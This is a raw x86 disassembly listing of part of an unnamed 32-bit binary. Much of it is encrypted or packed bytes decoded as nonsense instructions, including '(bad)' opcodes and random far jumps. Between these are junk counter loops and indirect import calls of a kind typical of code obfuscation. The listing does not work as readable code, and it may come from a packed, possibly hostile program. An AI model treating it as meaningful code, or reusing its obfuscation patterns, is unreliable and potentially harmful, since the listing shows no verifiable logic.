  40715b:	sub    dl,BYTE PTR [edi-0x2255a377]
  407161:	push   ebx
  407162:	and    eax,0x33ac7b34
  407167:	cs mov edx,0x2196f730
  40716d:	adc    ah,BYTE PTR [bx+di-0x7d9a]
  407172:	popa   
  407173:	rcl    DWORD PTR [ecx-0x5092cec4],0xbc
  40717a:	out    0xfc,eax
  40717c:	dec    eax
  40717d:	sbb    eax,0x4196b127
  407182:	in     al,0x99
  407184:	pop    edx
  407185:	mov    esp,0x477ec5b2
  40718a:	dec    ecx
  40718b:	mov    BYTE PTR [edi-0x5c],dh
  40718e:	rcr    BYTE PTR [edi],0xb2
  407191:	xchg   ecx,eax
  407192:	xchg   DWORD PTR [eax],esi
  407194:	retf   
  407195:	sub    eax,0x356e6deb
  40719a:	in     al,0x4a
  40719c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40719d:	push   edx
  40719e:	retf   
  40719f:	mov    ds:0xf193dfa7,eax
  4071a4:	or     DWORD PTR [ecx-0x69de3748],ebp
  4071aa:	dec    esp
  4071ab:	and    DWORD PTR [esi],esp
  4071ad:	mov    cl,0xf0
  4071af:	ins    BYTE PTR es:[edi],dx
  4071b0:	gs in  al,dx
  4071b2:	lahf   
  4071b3:	mov    esi,0xc187d03b
  4071b8:	mov    ebp,0xcb3b2238
  4071bd:	pop    esp
  4071be:	mov    eax,ds:0x80798641
  4071c3:	mov    dl,0xcd
  4071c5:	sbb    al,0x82
  4071c7:	scas   al,BYTE PTR es:[edi]
  4071c8:	enter  0x989,0x73
  4071cc:	pop    ss
  4071cd:	data16 xchg BYTE PTR [eax-0x28d223fe],al
  4071d4:	jbe    0x407250
  4071d6:	or     ah,BYTE PTR [edx-0x217f3107]
  4071dc:	pop    ecx
  4071dd:	add    DWORD PTR [esi-0xdc28e2f],esp
  4071e3:	ror    BYTE PTR [edx+0x46],cl
  4071e6:	push   edx
  4071e7:	xchg   ebx,eax
  4071e8:	xchg   edx,eax
  4071e9:	push   ss
  4071ea:	add    BYTE PTR [esi+0x40e85f3],0x91
  4071f1:	add    al,al
  4071f3:	test   DWORD PTR [edx],esp
  4071f5:	lds    edx,FWORD PTR [ebp-0x75]
  4071f8:	adc    BYTE PTR [ecx-0x19],0x9f
  4071fc:	and    eax,0x1dd4b51d
  407201:	inc    edx
  407202:	lds    eax,FWORD PTR [edx]
  407204:	and    BYTE PTR [ebp+0x13],bl
  407207:	pop    ds
  407208:	mov    eax,ds:0x666f36d1
  40720d:	shl    BYTE PTR ds:0x9568bfd1,1
  407213:	sbb    eax,0x77674ad4
  407218:	and    eax,0xdef7aa59
  40721d:	push   0x45b94b62
  407222:	xor    eax,0xf9137599
  407227:	xor    eax,0xe81e4a8c
  40722c:	fisttp DWORD PTR [esi+0x6a4dac78]
  407232:	imul   esp,DWORD PTR [edx],0xdae710d
  407238:	adc    bh,BYTE PTR [ecx+0x5b]
  40723b:	jns    0x4071fc
  40723d:	gs xchg edi,eax
  40723f:	jno    0x407252
  407241:	sbb    esi,ecx
  407243:	leave  
  407244:	ds cld 
  407246:	jnp    0x40729d
  407248:	leave  
  407249:	in     eax,dx
  40724a:	pop    eax
  40724b:	std    
  40724c:	shl    cl,cl
  40724e:	push   edx
  40724f:	xchg   ecx,eax
  407250:	jne    0x407260
  407252:	clc    
  407253:	rol    al,1
  407255:	inc    ebp
  407256:	xchg   ecx,eax
  407257:	jmp    0x4072ca
  407259:	mov    BYTE PTR [esi-0x7],bh
  40725c:	and    dh,dl
  40725e:	hlt    
  40725f:	add    ah,al
  407261:	addr16 push ss
  407263:	jo     0x407255
  407265:	aad    0xfb
  407267:	(bad)  
  407269:	arpl   WORD PTR [edx],si
  40726b:	pop    ecx
  40726c:	icebp  
  40726d:	(bad)  
  40726e:	hlt    
  40726f:	push   edi
  407270:	or     DWORD PTR [eax],ebp
  407272:	mov    al,ds:0x33a1831f
  407277:	rcl    BYTE PTR [ebp+0xc29be7c],1
  40727d:	mov    esi,0x6608eae1
  407282:	iret   
  407283:	fcomip st,st(6)
  407285:	mov    DWORD PTR [edi],0x45f240d
  40728b:	mov    ch,0xc1
  40728d:	mul    eax
  40728f:	sti    
  407290:	jno    0x40728f
  407292:	or     edi,DWORD PTR ss:[eax+0x291a4e0f]
  407299:	adc    eax,0xf914866c
  40729e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40729f:	or     bh,BYTE PTR [ebp+0x7b]
  4072a2:	fdivr  DWORD PTR [eax-0x5c]
  4072a5:	jp     0x4072db
  4072a7:	dec    edx
  4072a8:	cmp    edx,DWORD PTR [ecx+ebx*2]
  4072ab:	ret    0xdd31
  4072ae:	sub    eax,0x367cc405
  4072b3:	xchg   edi,eax
  4072b4:	mov    WORD PTR [ebx-0x2e],es
  4072b7:	out    0x76,al
  4072b9:	push   0xae643657
  4072be:	sub    BYTE PTR ds:[eax+0x36],dl
  4072c2:	(bad)  
  4072c4:	jne    0x4072c5
  4072c6:	xchg   ebx,eax
  4072c7:	pusha  
  4072c8:	cmp    DWORD PTR [eax+0x4abee5dd],0x6a2295d6
  4072d2:	sahf   
  4072d3:	jns    0x4072db
  4072d5:	stc    
  4072d6:	push   0xffffffd7
  4072d8:	mov    dh,0x7c
  4072da:	jmp    0xedd3:0x32380b04
  4072e1:	jae    0x4072bd
  4072e3:	fwait
  4072e4:	adc    al,0x7c
  4072e6:	lods   al,BYTE PTR ds:[esi]
  4072e7:	jmp    0x4072ac
  4072e9:	fisttp WORD PTR [esi-0x2be970c8]
  4072ef:	ss inc esp
  4072f1:	dec    ebp
  4072f2:	std    
  4072f3:	cmp    bl,BYTE PTR [ebp-0x6103c8e5]
  4072f9:	(bad)  
  4072fa:	xor    cl,BYTE PTR [ebx-0x310e0546]
  407300:	sti    
  407301:	xor    DWORD PTR [eax],esp
  407303:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407304:	test   BYTE PTR [edi+edi*2],dl
  407307:	inc    esi
  407308:	ins    DWORD PTR es:[edi],dx
  407309:	fucomip st,st(1)
  40730b:	xor    al,ah
  40730d:	or     DWORD PTR [edx+0x9],edx
  407310:	sti    
  407311:	test   DWORD PTR [ebp+0x1e796b2],0xa2e4f5d8
  40731b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40731c:	mov    ah,0x47
  40731e:	out    dx,eax
  40731f:	ss clc 
  407321:	cs jae 0x40737d
  407324:	out    0xb5,al
  407326:	aad    0xcd
  407328:	out    dx,al
  407329:	stc    
  40732a:	mov    bh,0xaf
  40732c:	mov    ebx,0xdc4b936
  407331:	sub    bh,BYTE PTR [eax]
  407333:	popa   
  407334:	xchg   DWORD PTR [ecx],ebp
  407336:	xchg   ebx,eax
  407337:	inc    esi
  407338:	cmp    eax,0x7e2d50d
  40733d:	mov    BYTE PTR [ebx-0x2c1400cc],al
  407343:	add    DWORD PTR [ebx-0x37a49732],edx
  407349:	ins    DWORD PTR es:[edi],dx
  40734a:	dec    edi
  40734b:	cmp    al,0x1b
  40734d:	loop   0x407389
  40734f:	add    DWORD PTR [edi-0x73],esp
  407352:	mov    ch,0xb0
  407354:	mov    BYTE PTR ss:[ecx+0x7],bh
  407358:	xchg   esi,eax
  407359:	xchg   ecx,eax
  40735a:	je     0x4073cf
  40735c:	jbe    0x4073d7
  40735e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40735f:	add    al,0x1b
  407361:	or     eax,0x998555b3
  407366:	push   esi
  407367:	data16 mov dh,0x24
  40736a:	loop   0x4072f7
  40736c:	mov    ch,0x70
  40736e:	jge    0x40732f
  407370:	ret    0x7add
  407373:	mov    al,ds:0xb341bee6
  407378:	or     ebx,DWORD PTR ds:0xff76e266
  40737e:	ds cld 
  407380:	mov    bl,0xe6
  407382:	inc    edi
  407383:	dec    ebp
  407384:	(bad)  
  407385:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  407387:	dec    esp
  407388:	jns    0x4073a2
  40738a:	icebp  
  40738b:	push   esi
  40738c:	fsub   DWORD PTR [ecx-0x2b]
  40738f:	push   ebp
  407390:	out    dx,eax
  407391:	sub    ch,bh
  407393:	bound  edi,QWORD PTR [esi]
  407395:	adc    DWORD PTR [esi],ecx
  407397:	sbb    ecx,0xffffffd0
  40739a:	mov    gs,WORD PTR [esi+0x7dec1787]
  4073a0:	test   DWORD PTR [edx],edx
  4073a2:	sar    DWORD PTR [esi-0x7f9d9a82],1
  4073a8:	call   0xf216:0x96e5e3b8
  4073af:	sbb    esp,0xcb6f8027
  4073b5:	scas   eax,DWORD PTR es:[edi]
  4073b6:	je     0x40734c
  4073b8:	int    0x8
  4073ba:	clc    
  4073bb:	push   es
  4073bc:	pop    esi
  4073bd:	in     al,dx
  4073be:	push   es
  4073bf:	cmp    dl,BYTE PTR [esi-0x235a6a36]
  4073c5:	retf   
  4073c6:	lods   eax,DWORD PTR ds:[esi]
  4073c7:	add    ch,BYTE PTR [esi+0x6250e92c]
  4073cd:	(bad)  
  4073cf:	pop    es
  4073d0:	ss jmp 0x55d4:0x2d29a84f
  4073d8:	xchg   edi,eax
  4073da:	ror    DWORD PTR ds:0x101c0b1,cl
  4073e0:	scas   al,BYTE PTR es:[edi]
  4073e1:	(bad)  
  4073e2:	and    al,0x26
  4073e4:	jmp    0x40745e
  4073e6:	cli    
  4073e7:	sbb    dl,BYTE PTR [ebp+0x76]
  4073ea:	inc    esi
  4073eb:	sbb    BYTE PTR [eax-0x120778ce],cl
  4073f1:	sti    
  4073f2:	enter  0xe1b4,0x37
  4073f6:	dec    ecx
  4073f7:	push   ebp
  4073f8:	jl     0x407450
  4073fa:	pop    ebp
  4073fb:	cmc    
  4073fc:	cmp    esi,DWORD PTR ds:0x59205662
  407402:	sti    
  407403:	out    dx,al
  407404:	adc    bl,ah
  407406:	sub    BYTE PTR [ebx-0x72d7ac90],al
  40740c:	mov    ebx,0x3a1ff4dc
  407411:	push   ecx
  407412:	inc    ebp
  407413:	ud1    esp,esp
  407416:	push   edi
  407417:	hlt    
  407418:	addr16 dec edi
  40741a:	mov    ecx,0x7f718324
  40741f:	repnz adc dl,ah
  407422:	or     ch,bl
  407424:	push   ecx
  407425:	xchg   ecx,eax
  407426:	js     0x4073cb
  407428:	jge    0x4073c8
  40742a:	loopne 0x40747c
  40742c:	clc    
  40742d:	pop    ecx
  40742e:	dec    ebp
  40742f:	outs   dx,BYTE PTR ds:[esi]
  407430:	repnz test edx,esi
  407433:	mov    dl,0x78
  407435:	sbb    DWORD PTR [ecx],esp
  407437:	mov    esp,0x41ad60d1
  40743c:	stos   DWORD PTR es:[edi],eax
  40743d:	add    DWORD PTR [edi-0x4],eax
  407440:	push   ebx
  407441:	mov    esi,0x3e1754b4
  407446:	stc    
  407447:	lahf   
  407448:	push   cs
  407449:	jo     0x4074a6
  40744b:	push   es
  40744c:	jp     0x40746d
  40744e:	in     eax,0x84
  407450:	data16 jecxz 0x4074b2
  407453:	cmp    BYTE PTR [edi],dl
  407455:	cmp    ah,BYTE PTR [esi]
  407457:	mov    ds:0x208b3bc9,eax
  40745c:	popa   
  40745d:	jb     0x4073e9
  40745f:	repz jp 0x4073f9
  407462:	dec    edi
  407463:	icebp  
  407464:	cmp    DWORD PTR [ebp-0x46],edi
  407467:	adc    al,cl
  407469:	xchg   ebp,eax
  40746a:	add    eax,DWORD PTR [edi]
  40746c:	xchg   esp,eax
  40746d:	loopne 0x40747d
  40746f:	push   0xfffffff6
  407471:	sub    al,0x6d
  407473:	pop    es
  407474:	arpl   si,dx
  407476:	jle    0x407425
  407478:	test   BYTE PTR [ecx],0x91
  40747b:	out    0x8b,eax
  40747d:	setg   BYTE PTR [ebp+ecx*8+0x5c75316]
  407485:	pop    ss
  407486:	aaa    
  407487:	inc    ebx
  407488:	add    BYTE PTR [edi],dl
  40748a:	add    BYTE PTR [eax],al
  40748c:	add    BYTE PTR [ebx+0x4337173d],al
  407492:	add    BYTE PTR [eax],al
  407494:	je     0x4074de
  40749a:	cmp    DWORD PTR ds:0x433717,0xc
  4074a1:	jne    0x4074b2
  4074a7:	push   0x26d7
  4074ac:	call   DWORD PTR ds:0x41218c
  4074b2:	cmp    DWORD PTR ds:0x433717,0xd
  4074b9:	jne    0x4074cc
  4074bf:	mov    ecx,DWORD PTR ds:0x433717
  4074c5:	dec    ecx
  4074c6:	mov    DWORD PTR ds:0x433717,ecx
  4074cc:	mov    ecx,DWORD PTR ds:0x433717
  4074d2:	dec    ecx
  4074d3:	mov    DWORD PTR ds:0x433717,ecx
  4074d9:	jmp    0x40748d
  4074de:	lea    eax,[ebp-0x18]
  4074e1:	not    DWORD PTR ds:0x43372b
  4074e7:	mov    DWORD PTR [ebp-0x1c],eax
  4074ea:	add    DWORD PTR ds:0x43372b,ecx
  4074f0:	jmp    0x407866
  4074f5:	xchg   esi,eax
  4074f6:	je     0x407544
  4074f8:	cwde   
  4074f9:	outs   dx,BYTE PTR ds:[esi]
  4074fa:	mov    al,ds:0x62ca7272
  4074ff:	mov    cl,0xe2
  407501:	xchg   edi,eax
  407502:	push   esi
  407503:	fistp  QWORD PTR [esi+0x56]
  407506:	enter  0x7c7c,0xd7
  40750a:	jns    0x407588
  40750c:	jl     0x40748e
  40750e:	jp     0x4074d5
  407510:	addr16 mov bh,0x17
  407513:	or     dl,BYTE PTR [eax+0x74]
  407516:	mov    DWORD PTR ds:0x5ea37d4e,ebp
  40751c:	inc    ebx
  40751d:	jmp    0x9d6ea504
  407522:	mov    bh,0x59
  407524:	ret    
  407525:	dec    ebx
  407526:	mov    ebx,DWORD PTR [edx+ecx*2+0x9392f57]
  40752d:	shl    BYTE PTR [ecx+0x67218ff1],cl
  407533:	loope  0x407572
  407535:	push   es
  407536:	jb     0x407555
  407538:	and    BYTE PTR [ebp+0xc5a3ed1],ch
  40753e:	inc    ebx
  40753f:	mov    ch,0x92
  407541:	pusha  
  407542:	leave  
  407543:	jl     0x4074f3
  407545:	cwde   
  407546:	(bad)  
  407547:	(bad)  
  407548:	int    0xa4
  40754a:	icebp  
  40754b:	nop
  40754c:	cmp    al,dl
  40754e:	sub    eax,0x689dcbbe
  407553:	pop    ecx
  407554:	retf   0x23b1
  407557:	and    al,0x42
  407559:	and    ch,BYTE PTR [eax]
  40755b:	out    dx,al
  40755c:	inc    eax
  40755d:	(bad)  
  40755e:	sub    BYTE PTR [ebx],ah
  407560:	jl     0x407509
  407562:	inc    ebx
  407563:	jmp    0xc56e:0xba614de8
  40756a:	mov    esi,0x9b0c54e
  40756f:	or     eax,0x69111c5f
  407574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407575:	push   ecx
  407576:	sti    
  407577:	mov    ds:0x8b386941,eax
  40757c:	adc    eax,0xa2b43d6a
  407581:	sub    dl,bl
  407583:	inc    ebx
  407584:	std    
  407585:	mov    dl,0xc8
  407587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407588:	sbb    BYTE PTR [ecx-0x4a],cl
  40758b:	shl    eax,cl
  40758d:	dec    eax
  40758e:	xor    eax,0xab7c52b6
  407593:	sub    bh,0x35
  407596:	sub    ch,BYTE PTR [ebp+0x563f9d5]
  40759c:	pop    DWORD PTR [esi+0x8]
  40759f:	add    al,0xc4
  4075a1:	sub    eax,0x2e1f8c5d
  4075a6:	sbb    cl,ah
  4075a8:	jg     0x4075b5
  4075aa:	sub    DWORD PTR [eax+0x19240255],ecx
  4075b0:	fcmove st,st(1)
  4075b2:	and    al,BYTE PTR [edx+edi*2-0x5ce70827]
  4075b9:	mov    bl,BYTE PTR [esi+edi*4]
  4075bc:	cmp    ah,BYTE PTR [ebx+0x144242b9]
  4075c2:	jl     0x407555
  4075c4:	out    dx,al
  4075c5:	mov    al,ds:0xac94f34b
  4075ca:	ficomp DWORD PTR [edi-0x45]
  4075cd:	arpl   WORD PTR [edx+0x27],dx
  4075d0:	data16 stos BYTE PTR es:[edi],al
  4075d2:	iret   
  4075d3:	daa    
  4075d4:	mov    cl,0x7c
  4075d6:	jp     0x4075e9
  4075d8:	scas   eax,DWORD PTR es:[edi]
  4075d9:	add    ecx,DWORD PTR [esp+esi*1-0x781451e0]
  4075e0:	pop    edi
  4075e1:	mov    dh,0xb6
  4075e3:	fwait
  4075e4:	stos   BYTE PTR es:[edi],al
  4075e5:	retf   0xca7f
  4075e8:	pop    ebx
  4075e9:	cwde   
  4075ea:	mov    ds:0x96f359ad,eax
  4075ef:	imul   BYTE PTR [esp+ecx*2+0x2c]
  4075f3:	lods   al,BYTE PTR ds:[esi]
  4075f4:	into   
  4075f5:	xlat   BYTE PTR ds:[ebx]
  4075f6:	dec    eax
  4075f7:	js     0x407602
  4075f9:	sub    eax,0x13a5f0d6
  4075fe:	pop    ss
  4075ff:	aas    
  407600:	imul   eax,DWORD PTR [ecx+0x1fbff677],0xffffffb5
  407607:	mov    dh,BYTE PTR [bx+di]
  40760a:	and    edi,DWORD PTR [ebp-0x7e56ff11]
  407610:	ret    0xcc70
  407613:	jge    0x407673
  407615:	xchg   edx,eax
  407616:	inc    ecx
  407617:	jmp    0x407599
  407619:	xchg   esp,eax
  40761a:	pmaddwd mm5,QWORD PTR cs:[ecx]
  40761e:	mov    eax,ds:0x85ec98d8
  407623:	and    ecx,DWORD PTR [ebp+0x45]
  407626:	adc    DWORD PTR [edi+0x41],edx
  407629:	mov    esp,DWORD PTR [eax]
  40762b:	cs mov gs,ecx
  40762e:	das    
  40762f:	loop   0x40769f
  407631:	cdq    
  407632:	aad    0x3b
  407634:	jnp    0x407648
  407636:	inc    edi
  407637:	loope  0x40766f
  407639:	mov    eax,0x141f9763
  40763e:	push   es
  40763f:	inc    edx
  407640:	mul    BYTE PTR [ecx]
  407642:	out    dx,al
  407643:	push   ds
  407644:	int3   
  407645:	jg     0x407602
  407647:	push   cs
  407648:	fwait
  407649:	sub    eax,0xca63dbf
  40764e:	fwait
  40764f:	scas   eax,DWORD PTR es:[edi]
  407650:	hlt    
  407651:	loope  0x407690
  407653:	add    al,0x82
  407655:	jp     0x40768d
  407657:	cdq    
  407658:	jg     0x4076d5
  40765a:	ins    BYTE PTR es:[edi],dx
  40765b:	cmp    BYTE PTR ds:0x4044ca76,dl
  407661:	push   esp
  407662:	jae    0x407619
  407664:	retf   
  407665:	loop   0x407636
  407667:	lods   eax,DWORD PTR ds:[esi]
  407668:	jmp    0x2a2d:0xb55a5f1
  40766f:	clc    
  407670:	mov    dh,0x65
  407672:	outs   dx,BYTE PTR ds:[esi]
  407673:	fiadd  DWORD PTR [edx+0x7f87e7f6]
  407679:	xchg   ecx,eax
  40767a:	jecxz  0x407620
  40767c:	and    bl,0xd
  40767f:	or     eax,0x2b8146db
  407684:	mov    BYTE PTR [eax+ebp*4],dh
  407687:	add    esi,DWORD PTR [ebp+0x6bb341af]
  40768d:	in     al,dx
  40768e:	(bad)  
  40768f:	sub    ecx,DWORD PTR [ecx-0x227b556f]
  407695:	lea    ebx,[eax]
  407697:	jmp    0xdd4b612f
  40769c:	dec    esi
  40769d:	and    edi,esp
  40769f:	int    0xd4
  4076a1:	sub    edx,DWORD PTR [ebx+0x18]
  4076a4:	rcr    DWORD PTR [ebx+0x66],cl
  4076a7:	xor    BYTE PTR [edi+0x2c],bh
  4076aa:	call   0xd0d35aa3
  4076af:	inc    esi
  4076b0:	stc    
  4076b1:	mov    bl,0xf9
  4076b3:	mov    dh,0xf1
  4076b5:	push   0xffffffed
  4076b7:	sbb    DWORD PTR [eax-0x1778ed01],0x29
  4076be:	adc    esi,DWORD PTR [edi-0x65e8144f]
  4076c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076c5:	lock pop eax
  4076c7:	imul   ebx,esi,0xffffffe8
  4076ca:	rcr    ch,0x1
  4076cd:	add    ch,BYTE PTR [edi]
  4076cf:	in     eax,dx
  4076d0:	sahf   
  4076d1:	(bad)  
  4076d2:	lahf   
  4076d3:	xlat   BYTE PTR ds:[ebx]
  4076d4:	gs mov esp,0xcba2647f
  4076da:	xchg   esp,eax
  4076db:	out    0xc9,al
  4076dd:	xchg   DWORD PTR [edi+ecx*8-0x1c7b8070],ecx
  4076e4:	(bad)  
  4076e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076e6:	inc    ecx
  4076e7:	dec    edx
  4076e8:	or     DWORD PTR [ecx+0x1b],0x71706759
  4076ef:	frstor [esi+0x39913ce6]
  4076f5:	out    dx,al
  4076f6:	xor    al,0xb4
  4076f8:	xchg   esi,eax
  4076f9:	xor    DWORD PTR [edx-0x859613b],0x1d34c6c0
  407703:	mov    al,0x22
  407705:	xlat   BYTE PTR ds:[ebx]
  407706:	mov    cl,cl
  407708:	cli    
  407709:	push   eax
  40770a:	xchg   ebp,eax
  40770b:	xchg   edi,eax
  40770c:	outs   dx,BYTE PTR ds:[esi]
  40770d:	in     eax,0x5a
  40770f:	sub    al,0xa1
  407711:	xchg   ebp,eax
  407712:	dec    eax
  407713:	jae    0x40772e
  407715:	stos   DWORD PTR es:[edi],eax
  407716:	pop    ecx
  407717:	jbe    0x407741
  407719:	fistp  DWORD PTR [ecx]
  40771b:	cmp    edx,ecx
  40771d:	xchg   edx,eax
  40771e:	dec    esp
  40771f:	and    eax,0x2f68e051
  407724:	xchg   edx,eax
  407725:	mov    ecx,0x16f6a21f
  40772a:	dec    ecx
  40772b:	inc    ebx
  40772c:	xor    cl,al
  40772e:	add    BYTE PTR [esp+esi*8+0x3c],ch
  407732:	fisubr WORD PTR [ecx]
  407734:	in     al,0xdd
  407736:	pop    es
  407737:	jge    0x4076e9
  407739:	xor    BYTE PTR [edi],ah
  40773b:	stc    
  40773c:	call   0x7c92a954
  407741:	xor    ebx,eax
  407743:	sub    BYTE PTR [eax+0x799bc70c],ch
  407749:	ins    BYTE PTR es:[edi],dx
  40774a:	addr16 sbb eax,0x44c1d71c
  407750:	lods   eax,DWORD PTR ds:[esi]
  407751:	in     eax,dx
  407752:	out    dx,al
  407753:	pop    es
  407754:	mov    ecx,DWORD PTR [edx-0x1ccf490d]
  40775a:	mov    ah,0x16
  40775c:	sahf   
  40775d:	xor    bl,BYTE PTR [ebx]
  40775f:	in     al,dx
  407760:	fisub  DWORD PTR [ebp+0x6e]
  407763:	jbe    0x4076ef
  407765:	fs mov edi,0x1b56ed51
  40776b:	popa   
  40776c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40776d:	fld    DWORD PTR [ebx+0x8]
  407770:	mov    ds:0xaf8769eb,al
  407775:	rcr    DWORD PTR [ecx+0x5a14559b],1
  40777b:	pop    ds
  40777c:	pop    ecx
  40777d:	xchg   ecx,eax
  40777e:	icebp  
  40777f:	jbe    0x4077f8
  407781:	sbb    DWORD PTR [edi+0x49ab897e],esi
  407787:	push   cs
  407788:	push   ebx
  407789:	cmp    al,0xe4
  40778b:	and    eax,0xb8267396
  407790:	icebp  
  407791:	xchg   esp,eax
  407792:	mov    ebp,0x19042d72
  407797:	push   ebx
  407798:	adc    BYTE PTR [esp+eax*8],ah
  40779b:	dec    ebp
  40779c:	or     BYTE PTR [edx],cl
  40779e:	fwait
  40779f:	jmp    FWORD PTR [eax-0x17d59e70]
  4077a5:	xchg   BYTE PTR [edx+0x61],dl
  4077a8:	rol    DWORD PTR [esp+ecx*1-0x5b3b3323],cl
  4077af:	loopne 0x407798
  4077b1:	(bad)  
  4077b3:	stos   DWORD PTR es:[edi],eax
  4077b4:	loop   0x407754
  4077b6:	bnd jmp 0x8b81eb5b
  4077bc:	or     ebx,ebx
  4077be:	pop    edx
  4077bf:	(bad)  
  4077c1:	rol    ah,cl
  4077c3:	sub    ebp,0xffffffb2
  4077c6:	stos   BYTE PTR es:[edi],al
  4077c7:	add    DWORD PTR [ebp-0x6e],esi
  4077ca:	sti    
  4077cb:	popa   
  4077cc:	or     eax,0x4f16744
  4077d1:	mov    ds:0x96b1332,eax
  4077d6:	and    eax,0xeba93bf4
  4077db:	or     bl,ch
  4077dd:	mov    bl,dl
  4077df:	cs xchg al,bh
  4077e2:	ret    
  4077e3:	sbb    eax,esi
  4077e5:	pop    ecx
  4077e6:	sbb    DWORD PTR [ecx],edi
  4077e8:	push   ds
  4077e9:	call   0x18c1:0x499cfdc8
  4077f0:	sahf   
  4077f1:	dec    edx
  4077f2:	mov    BYTE PTR [edx+0x6b],ch
  4077f5:	rol    BYTE PTR [esi+eax*2],cl
  4077f8:	xor    eax,0x196f6c89
  4077fd:	loop   0x4077c7
  4077ff:	addr16 push ebp
  407801:	fnstsw WORD PTR [edx]
  407803:	add    esi,edx
  407805:	mov    WORD PTR [edx+0x15c821b9],cs
  40780b:	neg    BYTE PTR [ecx+0x7]
  40780e:	jb     0x407847
  407810:	adc    esi,edi
  407812:	mov    al,0xf6
  407814:	les    ebx,FWORD PTR [ecx-0x73]
  407817:	int    0xb0
  407819:	pushf  
  40781a:	xchg   ebp,eax
  40781b:	clc    
  40781c:	popa   
  40781d:	or     DWORD PTR [eax-0x9806752],0x3e
  407824:	xor    edx,ecx
  407826:	xchg   esi,eax
  407827:	or     edi,ecx
  407829:	mov    fs,WORD PTR [ecx]
  40782b:	in     al,dx
  40782c:	xor    edi,DWORD PTR [esi+0x15]
  40782f:	pop    esp
  407830:	sbb    eax,0xbb8122bc
  407835:	fldenv [edi+0x51]
  407838:	xlat   BYTE PTR ds:[ebx]
  407839:	pop    es
  40783a:	cmc    
  40783b:	(bad)  
  40783c:	shl    DWORD PTR [ebp-0x7cece15e],cl
  407842:	jge    0x4078b4
  407844:	pop    eax
  407845:	jecxz  0x407828
  407847:	retf   
  407848:	pop    eax
  407849:	cmp    DWORD PTR [eax],0xffffffb4
  40784c:	pushf  
  40784d:	xchg   ecx,eax
  40784e:	cli    
  40784f:	inc    edx
  407850:	push   cs
  407851:	ret    
  407852:	adc    eax,0x2ade6e9
  407857:	test   al,0x47
  407859:	es dec esi
  40785b:	in     eax,0x23
  40785d:	add    BYTE PTR [eax-0x48],bl
  407860:	jge    0x407859
  407862:	jbe    0x4077ff
  407864:	aaa    
  407865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407866:	mov    eax,DWORD PTR [ebp-0x1c]
  407869:	and    DWORD PTR ds:0x433797,0x0
  407873:	mov    ebx,DWORD PTR ds:0x433797
  407879:	inc    ebx
  40787a:	mov    DWORD PTR ds:0x433797,ebx
  407880:	cmp    DWORD PTR ds:0x433797,0x6
  407887:	jne    0x407896
  40788d:	push   DWORD PTR [ebp-0x28]
  407890:	call   DWORD PTR ds:0x412190
  407896:	cmp    DWORD PTR ds:0x433797,0x5
  40789d:	jne    0x4078b0
  4078a3:	mov    ebx,DWORD PTR ds:0x433797
  4078a9:	inc    ebx
  4078aa:	mov    DWORD PTR ds:0x433797,ebx
  4078b0:	cmp    DWORD PTR ds:0x433797,0x15
  4078b7:	jb     0x407873
  4078bd:	push   esi
  4078be:	and    DWORD PTR ds:0x4336cb,edi
  4078c4:	push   edi
  4078c5:	and    DWORD PTR ds:0x43376b,0x0
  4078cf:	jmp    0x4078e1
  4078d4:	mov    edi,DWORD PTR ds:0x43376b
  4078da:	inc    edi
  4078db:	mov    DWORD PTR ds:0x43376b,edi
  4078e1:	cmp    DWORD PTR ds:0x43376b,0x18
  4078e8:	jae    0x4079ae
  4078ee:	cmp    DWORD PTR ds:0x43376b,0x8
  4078f5:	jne    0x407918
  4078fb:	push   0x117a
  407900:	push   DWORD PTR [ebp-0x28]
  407903:	push   0x433994
  407908:	push   0x86e1
  40790d:	push   0x5408
  407912:	call   DWORD PTR ds:0x41225c
  407918:	cmp    DWORD PTR ds:0x43376b,0x7
  40791f:	jne    0x407934
  407925:	xor    edi,edi
  407927:	xor    edi,DWORD PTR ds:0x43376b
  40792d:	inc    edi
  40792e:	mov    DWORD PTR ds:0x43376b,edi
  407934:	jmp    0x4078d4
  407939:	mov    DWORD PTR ds:0x4336cb,0x19
  407943:	cmp    DWORD PTR ds:0x4336cb,0x0
  40794a:	je     0x4079ae
  407950:	cmp    DWORD PTR ds:0x4336cb,0x9
  407957:	jne    0x40796e
  40795d:	push   DWORD PTR [ebp-0x1c]
  407960:	push   0x6ccd
  407965:	push   DWORD PTR [ebp-0x10]
  407968:	call   DWORD PTR ds:0x4120c4
  40796e:	cmp    DWORD PTR ds:0x4336cb,0xa
  407975:	jne    0x407988
  40797b:	mov    edi,DWORD PTR ds:0x4336cb
  407981:	dec    edi
  407982:	mov    DWORD PTR ds:0x4336cb,edi
  407988:	mov    edi,DWORD PTR ds:0x4336cb
  40798e:	dec    edi
  40798f:	mov    DWORD PTR ds:0x4336cb,edi
  407995:	jmp    0x407943
  40799a:	xor    edi,edi
  40799c:	add    edi,DWORD PTR ds:0x43376f
  4079a2:	or     edi,DWORD PTR ds:0x4337e3
  4079a8:	mov    DWORD PTR ds:0x43376f,edi
  4079ae:	mov    edi,0xf89f2dad
  4079b3:	and    DWORD PTR ds:0x433733,0x0
  4079bd:	jmp    0x4079cf
  4079c2:	mov    esi,DWORD PTR ds:0x433733
  4079c8:	inc    esi
  4079c9:	mov    DWORD PTR ds:0x433733,esi
  4079cf:	cmp    DWORD PTR ds:0x433733,0x1e
  4079d6:	jae    0x4079f7
  4079dc:	cmp    DWORD PTR ds:0x433733,0x2c
  4079e3:	jne    0x4079f2
  4079e9:	push   DWORD PTR [ebp-0x28]
  4079ec:	call   DWORD PTR ds:0x4120c8
  4079f2:	jmp    0x4079c2
  4079f7:	mov    DWORD PTR [eax],edi
  4079f9:	mov    eax,DWORD PTR [ebp-0x14]
  4079fc:	mov    ebx,DWORD PTR [ebp-0x8]
  4079ff:	mov    ecx,0x7510853
  407a04:	xor    eax,ecx
  407a06:	mov    esi,0x32729a
